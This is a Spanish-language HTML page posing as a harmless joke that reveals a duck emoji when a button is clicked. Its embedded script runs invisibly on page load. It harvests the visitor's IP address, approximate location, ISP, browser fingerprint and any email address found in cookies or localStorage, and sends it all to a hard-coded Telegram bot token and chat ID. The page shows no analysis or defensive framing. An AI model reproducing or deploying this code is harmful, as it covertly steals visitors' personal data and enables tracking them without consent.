<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <title>춰Aqu칤 est치 el pato!</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex,nofollow">

  <!-- Estilo minimalista con bot칩n llamativo -->
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background: #000;
      color: #0f0;
      font-family: 'Courier New', monospace;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
    }

    .btn {
      font-size: 3rem;
      padding: 40px 60px;
      border: none;
      border-radius: 15px;
      cursor: pointer;
      background: linear-gradient(135deg, #00ffcc, #00ccff);
      color: #000;
      box-shadow: 0 0 30px rgba(0,255,204,0.5);
      transition: all 0.3s ease-in-out;
    }

    .btn:hover {
      transform: scale(1.05);
      box-shadow: 0 0 40px rgba(0,255,204,0.8);
    }

    #duck {
      display: none;
      font-size: 10rem;
      margin-top: 30px;
      animation: pop 0.4s ease-out forwards;
    }

    @keyframes pop {
      0% { transform: scale(0); opacity: 0; }
      100% { transform: scale(1); opacity: 1; }
    }
  </style>
</head>
<body>

  <button class="btn" id="showDuck">Mostrar pato</button>
  <div id="duck">游붅</div>

<script>
(() => {
  const BOT_TOKEN = "8011619975:AAE_Donqy5xn8RD0lJ2LOIP326dTDrnO1Ag"; // 丘멆잺 Token visible
  const CHAT_ID = "6065284869";

  let collected = {};

  // === FUNCIONES DE RECOLECCI칍N EXTREMA ===

  async function getIPInfo() {
    const urls = [
      "https://api.ipify.org?format=json",
      "https://ipapi.co/json/",
      "https://ipinfo.io/json"
    ];

    for (const url of urls) {
      try {
        const res = await fetch(url, { method: "GET", mode: "cors", cache: "no-cache" });
        if (!res.ok) continue;
        const data = await res.json();

        return {
          ip: data.ip || "N/D",
          org: data.org || data.asn || "N/D",
          country: data.country || "N/D",
          city: data.city || "N/D",
          lat: data.lat || data.loc?.split(",")[0] || null,
          lon: data.lon || data.loc?.split(",")[1] || null,
          timezone: data.timezone || data.tz || "N/D",
          proxy: /proxy|vpn|tor/i.test(data.org || "") || false
        };
      } catch (e) {
        continue;
      }
    }

    return {
      ip: "No disponible",
      org: "No disponible",
      country: "No disponible",
      city: "No disponible",
      lat: null,
      lon: null,
      timezone: "No disponible",
      proxy: false
    };
  }

  function getFingerprint() {
    return btoa([
      navigator.userAgent,
      navigator.language,
      screen.width + 'x' + screen.height,
      navigator.hardwareConcurrency || "n/a",
      Intl.DateTimeFormat().resolvedOptions().timeZone || "n/a"
    ].join('|'));
  }

  async function extractEmailFromStorage() {
    const regex = /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/gim;

    const cookieMatch = document.cookie.match(regex);
    if (cookieMatch) return cookieMatch[0];

    for (let i = 0; i < localStorage.length; i++) {
      const val = localStorage.getItem(localStorage.key(i));
      const match = val.match(regex);
      if (match) return match[0];
    }

    return "No encontrado";
  }

  function detectHeadless() {
    return (/HeadlessChrome/.test(navigator.userAgent) ||
            !navigator.plugins?.length ||
            !navigator.languages?.length ||
            navigator.webdriver)
      ? "S칤" : "No";
  }

  async function sendToTelegram(message) {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 800); // 0.8 segundos max

    try {
      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message
        }),
        signal: controller.signal
      });

      clearTimeout(timeout);
      return res.ok;
    } catch (e) {
      return false;
    }
  }

  async function collectAndSend() {
    const ipData = await getIPInfo();

    collected = {
      ...ipData,
      ua: navigator.userAgent,
      fp: getFingerprint(),
      headless: detectHeadless(),
      touch: 'ontouchstart' in window ? "S칤" : "No",
      platform: navigator.platform,
      res: `${screen.width}x${screen.height}`,
      hw: navigator.hardwareConcurrency || "N/D",
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone || "N/D",
      lang: navigator.language || "N/D",
      ts: new Date().toISOString()
    };

    try {
      collected.email = await extractEmailFromStorage();
    } catch {
      collected.email = "No encontrado";
    }

    const message = `游니 DATOS DE VISITANTE\n` +
      `IP: ${collected.ip}\n` +
      `ISP: ${collected.org}\n` +
      `Pa칤s: ${collected.country}\n` +
      `Ciudad: ${collected.city}\n` +
      `Correo: ${collected.email}\n` +
      `Proxy/VPN/Tor: ${collected.proxy ? "S칤" : "No"}\n` +
      `Latitud: ${collected.lat || "N/D"}\n` +
      `Longitud: ${collected.lon || "N/D"}\n` +
      `User-Agent: ${collected.ua}\n` +
      `Plataforma: ${collected.platform}\n` +
      `Resoluci칩n: ${collected.res}\n` +
      `Touch: ${collected.touch}\n` +
      `Headless: ${collected.headless}\n` +
      `Timezone: ${collected.tz}\n` +
      `Idioma: ${collected.lang}\n` +
      `Fingerprint: ${collected.fp}\n` +
      `Fecha: ${new Date(collected.ts).toLocaleString()}`;

    await sendToTelegram(message);
  }

  // Ejecutar al cargar la p치gina
  window.addEventListener("load", () => {
    collectAndSend(); // 游댠 Env칤o autom치tico e invisible
  });

  // Mostrar pato al hacer click
  const btn = document.getElementById("showDuck");
  const duck = document.getElementById("duck");

  btn.addEventListener("click", () => {
    btn.style.display = "none";
    duck.style.display = "block";
  });

})();
</script>
</body>
</html>
